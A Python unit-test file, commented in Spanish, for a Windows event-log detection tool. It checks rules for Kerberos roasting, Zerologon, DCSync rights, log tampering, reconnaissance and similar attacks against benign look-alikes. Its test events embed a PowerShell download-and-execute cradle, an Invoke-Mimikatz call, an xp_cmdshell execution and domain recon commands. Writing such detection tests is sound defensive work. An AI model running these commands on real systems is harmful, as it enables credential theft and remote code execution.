"""Casos de seguridad y aplicaciones, con contrapartidas legítimas realistas."""
import unittest

from helpers import ev, sysmon
from winlog_hunter.rules import run_rules

SYSTEM = 'C:\\Windows\\System32\\'
PS = 'Microsoft-Windows-PowerShell/Operational'


def hits(rule_id, *events):
    return run_rules(events, only={rule_id})


class KerberosNtlm(unittest.TestCase):
    def test_asrep_and_normal_preauth(self):
        self.assertTrue(hits('WLH-032', ev(4768, TargetUserName='operador', PreAuthType='0', Status='0x0')))
        self.assertFalse(hits('WLH-032', ev(4768, TargetUserName='operador', PreAuthType='2', Status='0x0')))
        self.assertFalse(hits('WLH-032', ev(4768, TargetUserName='operador', PreAuthType='0', Status='0x18')))
        self.assertFalse(hits('WLH-032', ev(4768, TargetUserName='SERVER$', PreAuthType='0', Status='0x0')))

    def test_spray_needs_distinct_accounts(self):
        events = [ev(4771, i, TargetUserName=f'persona{i}', IpAddress='192.0.2.10', Status='0x18') for i in range(5)]
        self.assertTrue(run_rules(events, only={'WLH-002'}))
        for e in events:
            e.data['TargetUserName'] = 'cuenta_con_password_caducado'
        self.assertFalse(run_rules(events, only={'WLH-002'}))

    def test_alternative_credentials_are_only_low(self):
        self.assertEqual(hits('WLH-032', ev(4624, TargetUserName='operador', LogonType='9', LogonProcessName='seclogo'))[0].severity, 'low')
        self.assertTrue(hits('WLH-032', ev(4624, TargetUserName='operador', LogonType='3', AuthenticationPackageName='NTLM', KeyLength='0')))
        self.assertFalse(hits('WLH-032', ev(4624, TargetUserName='operador', LogonType='3', AuthenticationPackageName='Kerberos', KeyLength='0')))
        self.assertFalse(hits('WLH-032', ev(4624, TargetUserName='ANONYMOUS LOGON', TargetUserSid='S-1-5-7', LogonType='3', AuthenticationPackageName='NTLM', KeyLength='0')))

    def test_zerologon_requires_same_session_host_and_machine_account(self):
        logon = ev(4624, computer='DC01.example.test', TargetUserName='ANONYMOUS LOGON', TargetUserSid='S-1-5-7', LogonType='3', TargetLogonId='0x123', IpAddress='192.0.2.10')
        change = ev(4742, 1, computer=logon.computer, SubjectUserSid='S-1-5-7', SubjectLogonId='0x123', TargetUserName='DC01$')
        self.assertTrue(hits('WLH-032', logon, change))
        change.data['SubjectLogonId'] = '0x456'
        self.assertFalse(hits('WLH-032', logon, change))
        change.data['SubjectLogonId'] = '0x3e6'
        self.assertTrue(hits('WLH-032', logon, change))
        self.assertFalse(hits('WLH-032', change))


class DirectoryChanges(unittest.TestCase):
    def test_additions_not_cleanup_or_normal_computer_spn(self):
        for attr in ('msDS-AllowedToActOnBehalfOfOtherIdentity', 'msDS-KeyCredentialLink', 'servicePrincipalName'):
            item = ev(5136, AttributeLDAPDisplayName=attr, AttributeValue='valor de prueba', ObjectClass='user', OperationType='%%14674')
            self.assertTrue(hits('WLH-033', item))
            item.data['OperationType'] = '%%14675'
            self.assertFalse(hits('WLH-033', item))
        self.assertFalse(hits('WLH-033', ev(5136, AttributeLDAPDisplayName='servicePrincipalName', AttributeValue='HOST/server', ObjectClass='computer', OperationType='%%14674')))

    def test_replication_allow_not_deny(self):
        for ace, expected in (('OA', True), ('OD', False)):
            value = '(' + ace + ';;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-1-2-3-1100)'
            self.assertEqual(bool(hits('WLH-033', ev(5136, AttributeLDAPDisplayName='nTSecurityDescriptor', AttributeValue=value, OperationType='%%14674'))), expected)

    def test_accounts_and_privileged_password_reset(self):
        self.assertTrue(hits('WLH-033', ev(4742, TargetUserName='SERVER$', SamAccountName='NEWNAME')))
        self.assertFalse(hits('WLH-033', ev(4742, TargetUserName='SERVER$', SamAccountName='NEWNAME$')))
        self.assertEqual(hits('WLH-033', ev(4742, ServicePrincipalNames='GC/dc.example.test/example.test'))[0].severity, 'low')
        self.assertTrue(hits('WLH-033', ev(4724, TargetSid='S-1-5-21-1-2-3-500')))
        self.assertFalse(hits('WLH-033', ev(4724, TargetSid='S-1-5-21-1-2-3-1100')))
        self.assertTrue(hits('WLH-033', ev(4794)))
        self.assertTrue(hits('WLH-033', ev(4765)))


class PrivilegesAndSystem(unittest.TestCase):
    def test_user_privilege_and_legitimate_service_debugger(self):
        self.assertTrue(hits('WLH-034', ev(4703, ProcessName=r'C:\Users\operador\tool.exe', EnabledPrivilegeList='SeDebugPrivilege')))
        self.assertFalse(hits('WLH-034', ev(4703, ProcessName=SYSTEM+'svchost.exe', EnabledPrivilegeList='SeDebugPrivilege')))
        self.assertFalse(hits('WLH-034', ev(4703, ProcessName=r'C:\Program Files\Microsoft Visual Studio\Common7\IDE\devenv.exe', EnabledPrivilegeList='SeDebugPrivilege')))
        self.assertFalse(hits('WLH-034', ev(4703, ProcessName=r'C:\Users\operador\tool.exe', DisabledPrivilegeList='SeDebugPrivilege')))

    def test_boot_and_audit_policy(self):
        self.assertTrue(hits('WLH-034', ev(4826, KernelDebug='%%1842', TestSigning='%%1843')))
        self.assertFalse(hits('WLH-034', ev(4826, KernelDebug='%%1843', TestSigning='%%1843')))
        self.assertTrue(hits('WLH-034', ev(4719, AuditPolicyChanges='%%8448')))
        self.assertFalse(hits('WLH-034', ev(4719, AuditPolicyChanges='Success added')))

    def test_eventlog_stop_not_printer_service_stop(self):
        self.assertTrue(hits('WLH-034', ev(7036, channel='System', provider='Service Control Manager', param1='Windows Event Log', param2='stopped')))
        self.assertFalse(hits('WLH-034', ev(7036, channel='System', provider='Service Control Manager', param1='Print Spooler', param2='stopped')))
        self.assertTrue(hits('WLH-034', ev(7040, channel='System', provider='Service Control Manager', param1='eventlog', param2='auto', param3='disabled')))

    def test_ntfs_transaction_alone_is_not_doppelganging(self):
        transaction = ev(4985, ProcessId='0x10')
        tamper = ev(25, 1, channel='Microsoft-Windows-Sysmon/Operational', ProcessId='16', Image=r'C:\Users\operador\app.exe')
        self.assertFalse(hits('WLH-034', transaction))
        self.assertTrue(hits('WLH-034', transaction, tamper))
        tamper.data['ProcessId'] = '17'
        self.assertFalse(hits('WLH-034', transaction, tamper))


class Reconnaissance(unittest.TestCase):
    def test_group_query_and_normal_mmc(self):
        self.assertTrue(hits('WLH-035', ev(4799, CallerProcessName=r'C:\Users\operador\inventory.exe', TargetUserName='Administrators')))
        self.assertFalse(hits('WLH-035', ev(4799, CallerProcessName=SYSTEM+'mmc.exe', TargetUserName='Administrators')))
        self.assertFalse(hits('WLH-035', ev(4798, CallerProcessName=r'C:\Windows\explorer.exe', TargetUserName='operador')))

    def test_rpc_requires_three_distinct_pipes(self):
        items = [ev(5145, i, ShareName=r'\\*\IPC$', RelativeTargetName=pipe, SubjectUserName='operador', IpAddress='192.0.2.10') for i, pipe in enumerate(('srvsvc','samr','lsarpc'))]
        self.assertTrue(hits('WLH-035', *items))
        self.assertFalse(hits('WLH-035', *items[:2]))
        items[2].data['RelativeTargetName'] = 'samr'
        self.assertFalse(hits('WLH-035', *items))

    def test_recon_commands_burst_not_one_administrative_query(self):
        items = [sysmon(i, SYSTEM+image, cmd) for i,(image,cmd) in enumerate((('net.exe','net user /domain'),('net.exe','net group /domain'),('nltest.exe','nltest /dclist:example.test')))]
        self.assertTrue(hits('WLH-035', *items))
        self.assertFalse(hits('WLH-035', items[0]))


class DefenderBits(unittest.TestCase):
    def test_malware_event_requires_defender_source(self):
        self.assertTrue(hits('WLH-036', ev(1116, channel='Microsoft-Windows-Windows Defender/Operational', provider='Microsoft-Windows-Windows Defender', ThreatName='Amenaza de prueba')))
        self.assertFalse(hits('WLH-036', ev(1116, channel='Application', provider='VendorUpdater')))
        self.assertTrue(hits('WLH-036', ev(5001, channel='Microsoft-Windows-Windows Defender/Operational')))
        self.assertFalse(hits('WLH-036', ev(5007, channel='Microsoft-Windows-Windows Defender/Operational', NewValue='EngineVersion=2')))

    def test_bits_external_exe_not_normal_windows_update(self):
        data = dict(url='https://example.org/tool.exe', jobId='{JOB}', processPath=SYSTEM+'powershell.exe')
        self.assertTrue(hits('WLH-036', ev(59, channel='Microsoft-Windows-Bits-Client/Operational', **data)))
        data['processPath'] = SYSTEM+'svchost.exe'
        self.assertFalse(hits('WLH-036', ev(59, channel='Microsoft-Windows-Bits-Client/Operational', **data)))
        data.update(processPath=SYSTEM+'powershell.exe', url='http://intranet.local/package.exe')
        self.assertFalse(hits('WLH-036', ev(59, channel='Microsoft-Windows-Bits-Client/Operational', **data)))
        data['url'] = SYSTEM+'cmd.exe'
        self.assertTrue(hits('WLH-036', ev(59, channel='Microsoft-Windows-Bits-Client/Operational', **data)))
        data['url'] = r'C:\PackageCache\vendor.msi'
        self.assertFalse(hits('WLH-036', ev(59, channel='Microsoft-Windows-Bits-Client/Operational', **data)))


class PowerShellAndApplications(unittest.TestCase):
    def test_powershell_module_classic_and_legitimate_string_building(self):
        for event in (ev(4103, channel=PS, Payload='Invoke-Mimikatz'), ev(800, channel='Windows PowerShell', Data0='IEX (New-Object Net.WebClient).DownloadString("https://example.org/a")')):
            self.assertTrue(hits('WLH-021', event))
        self.assertFalse(hits('WLH-021', ev(800, channel='Windows PowerShell', Data0='[char]65; $names -join ","')))
        self.assertFalse(hits('WLH-021', ev(800, channel='Application', Data0='Invoke-Mimikatz')))
        self.assertEqual(hits('WLH-021', ev(4103, channel=PS, Payload='(New-Object Net.WebClient).DownloadFile("https://example.org/data.txt", "data.txt")'))[0].severity, 'low')

    def test_sql_brute_force_not_one_wrong_password(self):
        items = [ev(18456, i, channel='Application', provider='MSSQLSERVER', Data0='report_user', Data2='[CLIENT: 192.0.2.10]') for i in range(5)]
        self.assertTrue(hits('WLH-001', *items))
        self.assertFalse(hits('WLH-001', items[0]))

    def test_sql_shell_enable_not_disable_or_other_option(self):
        self.assertTrue(hits('WLH-024', ev(15457, channel='Application', provider='MSSQLSERVER', Data0='xp_cmdshell', Data1='0', Data2='1')))
        self.assertFalse(hits('WLH-024', ev(15457, channel='Application', provider='MSSQLSERVER', Data0='xp_cmdshell', Data1='1', Data2='0')))
        self.assertFalse(hits('WLH-024', ev(15457, channel='Application', provider='MSSQLSERVER', Data0='show advanced options', Data1='0', Data2='1')))
        self.assertTrue(hits('WLH-024', ev(33205, channel='Application', provider='MSSQLSERVER', statement="EXEC master.dbo.xp_cmdshell 'whoami'", succeeded='true')))

    def test_esent_and_silent_exit_not_normal_database_or_crash(self):
        self.assertTrue(hits('WLH-014', ev(325, channel='Application', provider='ESENT', Data4=r'C:\Backup\Active Directory\ntds.dit')))
        self.assertFalse(hits('WLH-014', ev(326, channel='Application', provider='ESENT', Data4=r'C:\Windows\NTDS\ntds.dit')))
        self.assertFalse(hits('WLH-014', ev(325, channel='Application', provider='ESENT', Data4=r'C:\Users\operador\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat')))
        self.assertTrue(hits('WLH-014', ev(3001, channel='Application', provider='Microsoft-Windows-ProcessExitMonitor', param1=SYSTEM+'lsass.exe')))
        self.assertFalse(hits('WLH-014', ev(3001, channel='Application', provider='Microsoft-Windows-ProcessExitMonitor', param1=SYSTEM+'notepad.exe')))

    def test_remote_msi_not_local_update(self):
        self.assertTrue(hits('WLH-011', ev(1040, channel='Application', provider='MsiInstaller', Data0='https://example.org/product.msi')))
        self.assertFalse(hits('WLH-011', ev(1040, channel='Application', provider='MsiInstaller', Data0=r'C:\Windows\Installer\product.msi')))


if __name__ == '__main__':
    unittest.main()
